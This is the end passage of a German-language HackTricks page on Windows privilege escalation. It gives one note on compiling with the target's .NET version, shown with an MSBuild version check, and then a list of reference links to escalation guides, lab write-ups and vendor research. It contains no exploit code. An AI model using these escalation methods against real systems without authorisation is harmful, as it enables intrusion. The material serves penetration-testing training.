Du musst das Projekt mit der korrekten .NET-Version kompilieren ([siehe dies](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte Version von .NET auf dem Zielsystem zu sehen, kannst du:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Quellen

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
